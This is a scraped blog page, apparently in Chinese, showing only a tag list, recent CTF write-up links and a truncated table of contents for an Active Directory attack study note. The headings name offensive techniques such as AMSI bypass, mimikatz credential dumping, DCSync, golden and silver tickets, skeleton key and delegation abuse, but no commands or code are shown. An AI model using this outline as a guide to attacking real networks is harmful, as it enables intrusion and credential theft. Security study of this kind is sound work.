class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pth/" rel="tag">pth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reg/" rel="tag">reg</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpc/" rel="tag">rpc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpcclient/" rel="tag">rpcclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/service/" rel="tag">service</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" rel="tag">smbmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/splunk/" rel="tag">splunk</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/spn/" rel="tag">spn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqlcmd/" rel="tag">sqlcmd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sssd/" rel="tag">sssd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ssti/" rel="tag">ssti</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/svn/" rel="tag">svn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/symlink/" rel="tag">symlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sysctl/" rel="tag">sysctl</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/teampass/" rel="tag">teampass</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wapt/" rel="tag">wapt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/08/29/wiz-2025-cloudsecuritychampionship-3/" title="【Wiz 2025】Breaking The Barriers" >
            <div class="recent-link-text">
              【Wiz 2025】Breaking The Barriers
            </div>
          </a>
        
          <a class="recent-link" href="/2025/08/11/wiz-2025-cloudsecuritychampionship-2/" title="【Wiz 2025】Contain Me If You Can" >
            <div class="recent-link-text">
              【Wiz 2025】Contain Me If You Can
            </div>
          </a>
        
          <a class="recent-link" href="/2025/07/14/htb-wp-Outbound/" title="【season-8】 htb Outbound wp" >
            <div class="recent-link-text">
              【season-8】 htb Outbound wp
            </div>
          </a>
        
          <a class="recent-link" href="/2025/07/11/Tracks-AD-Coder/" title="Tracks-AD-Coder" >
            <div class="recent-link-text">
              Tracks-AD-Coder
            </div>
          </a>
        
          <a class="recent-link" href="/2025/07/06/htb-wp-Voleur/" title="【season-8】 htb Voleur wp" >
            <div class="recent-link-text">
              【season-8】 htb Voleur wp
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div> 
</sidebar>


    </div>
    
    <div id="toc" class="widget-wrap">
      <button class="toc-toggle" onclick="toggleTOC()">
    <span class="toc-toggle-icon">
        <i class="fa fa-angle-down" aria-hidden="true" style="border-radius: 50%; padding: 5px; border: 1px solid var(--link);"></i>
    </span>
</button>
<div id="tocContainer" style="display: block;">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#01-DACL"><span class="toc-number">1.</span> <span class="toc-text">01 DACL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E5%A4%9A%E4%B8%AA%E6%9D%83%E9%99%90%E5%9C%BA%E6%99%AF%E7%9A%84DACL%E5%8C%B9%E9%85%8D"><span class="toc-number">1.1.</span> <span class="toc-text">1.用户多个权限场景的DACL匹配</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ACL%E6%9D%83%E9%99%90%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">2.ACL权限利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BE%E6%94%B6%E9%9B%86%E5%9F%9F%E5%86%85ACL"><span class="toc-number">1.3.</span> <span class="toc-text">3.枚举收集域内ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-AdminSDHolder"><span class="toc-number">1.4.</span> <span class="toc-text">4.AdminSDHolder</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#01-%E5%88%A9%E7%94%A8AdminSD"><span class="toc-number">1.4.1.</span> <span class="toc-text">01.利用AdminSD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#02-%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%AC%E6%89%8B%E5%8A%A8%E8%A7%A6%E5%8F%91adminSD%E5%90%8C%E6%AD%A5"><span class="toc-number">1.4.2.</span> <span class="toc-text">02.加载脚本手动触发adminSD同步</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#03-%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83"><span class="toc-number">1.4.3.</span> <span class="toc-text">03.如何防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E3%80%81%E6%B7%BB%E5%8A%A0%E7%AD%89%EF%BC%88%E5%91%BD%E4%BB%A4%E6%A0%B7%E4%BE%8B%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">5.权限修改、添加等（命令样例）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%9F%BA%E4%BA%8EACL%E5%88%A9%E7%94%A8%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.6.</span> <span class="toc-text">6.基于ACL利用的访问持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WMI%E7%9A%84ACL%E4%BF%AE%E6%94%B9"><span class="toc-number">1.6.1.</span> <span class="toc-text">WMI的ACL修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell%E8%BF%9C%E7%A8%8B%E7%9A%84ACL%E4%BF%AE%E6%94%B9"><span class="toc-number">1.6.2.</span> <span class="toc-text">Powershell远程的ACL修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90"><span class="toc-number">1.6.3.</span> <span class="toc-text">远程注册表权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-domain-enumeration"><span class="toc-number">2.</span> <span class="toc-text">02 domain enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%AF%E8%83%BD%E4%BC%9A%E6%9C%89%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84-description%EF%BC%88%E6%8F%8F%E8%BF%B0%EF%BC%89%E5%B1%9E%E6%80%A7%E8%A2%AB%E5%86%99%E4%BA%86%E6%98%8E%E6%96%87%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">1.可能会有域用户的 description（描述）属性被写了明文敏感信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%BE%E5%88%B0%E5%9F%9F%E5%86%85%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%E7%9A%84%E6%9C%BA%E5%99%A8%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%99%BB%E5%BD%95%E6%AC%A1%E6%95%B0%E6%9D%A5%E5%88%A4%E6%96%AD"><span class="toc-number">2.2.</span> <span class="toc-text">2.找到域内实际使用的机器，可以通过登录次数来判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9E%9A%E4%B8%BE%E7%BB%84"><span class="toc-number">2.3.</span> <span class="toc-text">3.枚举组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sid%E6%98%AF%E5%94%AF%E4%B8%80%E6%A0%87%E8%AF%86%EF%BC%8C%E6%97%A0%E6%B3%95%E5%87%BA%E7%8E%B0%E4%BF%A9%E7%9B%B8%E5%90%8C%E7%9A%84"><span class="toc-number">2.4.</span> <span class="toc-text">sid是唯一标识，无法出现俩相同的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E4%B8%80%E4%B8%AA%E5%9F%9F%E6%94%B6%E5%88%B0%E4%BA%86%E6%94%BB%E5%87%BB%EF%BC%8C%E6%95%B4%E4%B8%AA%E5%9F%9F%E6%9E%97%E6%97%A9%E6%99%9A%E9%83%BD%E4%BC%9AG%EF%BC%8C%EF%BC%88%E8%BF%99%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%E5%B0%86%E4%BC%9A%E5%9C%A8-19-%E5%92%8C-20-%E8%8A%82%E8%AF%BE%E4%B8%AD%E5%AD%A6%E5%88%B0%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">如果一个域收到了攻击，整个域林早晚都会G，（这部分内容将会在 19 和 20 节课中学到）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9E%9A%E4%B8%BE%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84%E4%BA%BA%E5%91%98"><span class="toc-number">2.6.</span> <span class="toc-text">4.枚举域管理员组人员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%80%9A%E8%BF%87%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7%E6%89%80%E5%B1%9E%E7%BB%84"><span class="toc-number">2.7.</span> <span class="toc-text">5.通过用户名枚举用户所属组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%97%E5%87%BA%E6%9C%AC%E5%9C%B0-%E7%BB%84-%E6%88%96-%E7%BB%84%E6%88%90%E5%91%98"><span class="toc-number">2.8.</span> <span class="toc-text">6.列出本地 组 或 组成员</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%9E%9A%E4%B8%BE-smbshare"><span class="toc-number">2.9.</span> <span class="toc-text">7.枚举 smbshare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-bloodhound%E9%81%9B%E7%8B%97"><span class="toc-number">2.10.</span> <span class="toc-text">8.bloodhound遛狗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-SOAPHound"><span class="toc-number">2.11.</span> <span class="toc-text">9.SOAPHound</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E5%9F%9F%E4%BC%9A%E8%AF%9D%EF%BC%88session%EF%BC%89%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.12.</span> <span class="toc-text">10.域会话（session）枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%9F%A5%E8%AF%A2%E7%94%A8%E6%88%B7%E8%A2%AB%E9%85%8D%E7%BD%AE%E4%B8%BA%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E7%9A%84%E6%9C%BA%E5%99%A8-%E6%9E%9A%E4%B8%BE"><span class="toc-number">2.13.</span> <span class="toc-text">11.查询用户被配置为本地管理员的机器 枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-powershell"><span class="toc-number">3.</span> <span class="toc-text">03 powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-amsi"><span class="toc-number">3.1.</span> <span class="toc-text">bypass amsi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97"><span class="toc-number">3.2.</span> <span class="toc-text">加载模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%A8%A1%E5%9D%97%E4%B8%AD%E5%8F%AF%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">3.3.</span> <span class="toc-text">列出模块中可用的命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-%E4%B8%8B%E8%BD%BD"><span class="toc-number">3.4.</span> <span class="toc-text">powershell 下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%BC%8F"><span class="toc-number">3.5.</span> <span class="toc-text">powershell 语言模式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#applocker"><span class="toc-number">3.5.1.</span> <span class="toc-text">applocker</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E5%8F%97%E9%99%90"><span class="toc-number">3.6.</span> <span class="toc-text">powershell执行脚本受限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OPSEC"><span class="toc-number">4.</span> <span class="toc-text">OPSEC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.1.</span> <span class="toc-text">域票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7"><span class="toc-number">4.2.</span> <span class="toc-text">域用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04-GPO-OU"><span class="toc-number">5.</span> <span class="toc-text">04 GPO,OU</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GPO"><span class="toc-number">5.1.</span> <span class="toc-text">GPO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OU"><span class="toc-number">5.2.</span> <span class="toc-text">OU</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E9%99%90%E7%BB%84"><span class="toc-number">5.3.</span> <span class="toc-text">受限组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPO%E6%BB%A5%E7%94%A8"><span class="toc-number">5.4.</span> <span class="toc-text">GPO滥用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-domain-Trusts"><span class="toc-number">6.</span> <span class="toc-text">05 domain Trusts</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.1.</span> <span class="toc-text">外部信任</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forest-Trusts"><span class="toc-number">6.2.</span> <span class="toc-text">Forest Trusts</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%9F%9F%E5%90%8D%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.3.</span> <span class="toc-text">枚举域名信任</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-Forest"><span class="toc-number">6.4.</span> <span class="toc-text">枚举 Forest</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E5%9F%9F%E6%9E%97%E4%B8%AD%E7%9A%84%E5%9F%9F"><span class="toc-number">6.5.</span> <span class="toc-text">获取指定域林中的域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%9E%97%E4%B8%AD%E7%9A%84%E5%85%A8%E5%B1%80%E7%BC%96%E5%BD%95%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E6%9E%9A%E4%B8%BE%E4%BD%9C%E4%B8%BA%E5%85%A8%E5%B1%80%E7%9B%AE%E5%BD%95%E7%9A%84DC%E6%8E%A7%E5%88%B6%E5%99%A8%EF%BC%89"><span class="toc-number">6.6.</span> <span class="toc-text">列出林中的全局编录服务器（枚举作为全局目录的DC控制器）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E5%9F%9F%E6%9E%97%E4%B9%8B%E9%97%B4%E4%BF%A1%E4%BB%BB"><span class="toc-number">6.7.</span> <span class="toc-text">枚举域林之间信任</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">06 权限提升(Privilege Escalation)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BC%BA%E9%99%B7%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="toc-number">7.1.</span> <span class="toc-text">1.缺陷服务枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9C%AC%E8%BA%AB%E5%B0%B1%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E9%AB%98%E6%9D%83%E6%9C%8D%E5%8A%A1"><span class="toc-number">7.2.</span> <span class="toc-text">2.本身就易受攻击的高权服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-NTLM-KRB%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB"><span class="toc-number">7.3.</span> <span class="toc-text">3.NTLM&#x2F;KRB中继攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">8.</span> <span class="toc-text">07 横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#08-%E7%9B%B8%E5%85%B3%E6%95%8F%E6%84%9F%E5%87%AD%E6%8D%AE%E6%8F%90%E5%8F%96"><span class="toc-number">9.</span> <span class="toc-text">08 相关敏感凭据提取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz"><span class="toc-number">9.1.</span> <span class="toc-text">mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DC%E4%B8%ADdump%E6%89%80%E6%9C%89%E5%9F%9F%E5%87%AD%E6%8D%AE"><span class="toc-number">9.1.1.</span> <span class="toc-text">DC中dump所有域凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dump%E5%87%AD%E6%8D%AE-dump-credentials"><span class="toc-number">9.1.2.</span> <span class="toc-text">dump凭据 dump credentials</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92-pth"><span class="toc-number">9.1.3.</span> <span class="toc-text">哈希传递(pth)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DCSync"><span class="toc-number">9.1.4.</span> <span class="toc-text">DCSync</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PS%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95"><span class="toc-number">9.2.</span> <span class="toc-text">PS历史命令记录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8"><span class="toc-number">9.2.1.</span> <span class="toc-text">票据利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#09-kerberos"><span class="toc-number">10.</span> <span class="toc-text">09 kerberos</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-PAC"><span class="toc-number">10.1.</span> <span class="toc-text">1.PAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Golden-Ticket"><span class="toc-number">10.2.</span> <span class="toc-text">2.Golden Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%87%91%E7%A5%A8%EF%BC%9A"><span class="toc-number">10.2.1.</span> <span class="toc-text">利用金票：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-silver-Ticket"><span class="toc-number">10.3.</span> <span class="toc-text">3.silver Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E9%93%B6%E7%A5%A8"><span class="toc-number">10.3.1.</span> <span class="toc-text">1.利用银票</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Diamond-Ticket"><span class="toc-number">10.4.</span> <span class="toc-text">4.Diamond Ticket</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E9%92%BB%E7%9F%B3%E7%A5%A8"><span class="toc-number">10.4.1.</span> <span class="toc-text">1.利用钻石票</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Skeleton-key"><span class="toc-number">10.5.</span> <span class="toc-text">5.Skeleton key</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99"><span class="toc-number">10.5.1.</span> <span class="toc-text">1.注入万能钥匙</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-DSRM"><span class="toc-number">10.6.</span> <span class="toc-text">6.DSRM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96DSRM%E5%87%AD%E6%8D%AE"><span class="toc-number">10.6.1.</span> <span class="toc-text">1.获取DSRM凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8DSRM%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7"><span class="toc-number">10.6.2.</span> <span class="toc-text">2.利用DSRM管理员账户</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Custom-SSP"><span class="toc-number">10.7.</span> <span class="toc-text">7.Custom SSP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">10.7.1.</span> <span class="toc-text">1.利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-kerberoasting"><span class="toc-number">10.8.</span> <span class="toc-text">8.kerberoasting</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-SPN"><span class="toc-number">10.8.1.</span> <span class="toc-text">1.SPN</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">10.8.1.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-AS-REProast"><span class="toc-number">10.8.2.</span> <span class="toc-text">2.AS-REProast</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">10.8.2.1.</span> <span class="toc-text">利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-Kerberos-Delegation-%EF%BC%88%E5%A7%94%E6%B4%BE%EF%BC%89"><span class="toc-number">10.9.</span> <span class="toc-text">9.Kerberos Delegation （委派）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%97%A0%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Unconstrained-Delegation"><span class="toc-number">10.9.1.</span> <span class="toc-text">1.无约束委派 Unconstrained Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9E%9A%E4%B8%BE"><span class="toc-number">10.9.1.1.</span> <span class="toc-text">1.枚举</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8"><span class="toc-number">10.9.1.2.</span> <span class="toc-text">2.利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Constrained-Delegation"><span class="toc-number">10.9.2.</span> <span class="toc-text">2.约束委派 Constrained Delegation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#S4U2Self"><span class="toc-number">10.9.2.1.</span> <span class="toc-text">S4U2Self</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#S4U4Proxy"><span class="toc-number">10.9.2.2.</span> <span class="toc-text">S4U4Proxy</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AF%BB%E6%89%BE%E5%90%AF%E7%94%A8%E4%BA%86%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E7%94%A8%E6%88%B7%E6%88%96%E6%9C%BA%E5%99%A8"><span class="toc-number">10.9.2.3.</span> <span class="toc-text">1.寻找启用了约束委派的用户或机器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8-S4U2Self-S4U2Proxy-%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.9.2.4.</span> <span class="toc-text">2.利用 S4U2Self + S4U2Proxy 访问服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8D%E7%A7%B0%E4%B8%8D%E5%8F%98-%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9S4U2proxy%E8%AF%B7%E6%B1%82%E5%9B%9E%E6%9D%A5%E7%9A%84%E7%A5%A8%E6%8D%AE%E4%B8%AD%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%A5%E8%AE%BF%E9%97%AE%E9%AB%98%E4%BB%B7%E5%80%BC%E6%9C%8D%E5%8A%A1"><span class="toc-number">10.9.2.5.</span> <span class="toc-text">3.服务器名称不变 通过修改S4U2proxy请求回来的票据中的服务来访问高价值服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8-S4U2Self-%E4%BC%AA%E9%80%A0%E9%AB%98%E6%9D%83%E7%94%A8%E6%88%B7%E4%BF%AE%E6%94%B9%E5%BD%93%E5%89%8D%E6%9C%8D%E5%8A%A1%E8%B4%A6%E6%88%B7ms-AllowedToDelegateTo%E5%B1%9E%E6%80%A7%E6%8C%87%E5%90%91%E9%AB%98%E4%BB%B7%E5%80%BC%E6%9C%BA%E5%99%A8%E6%9C%8D%E5%8A%A1"><span 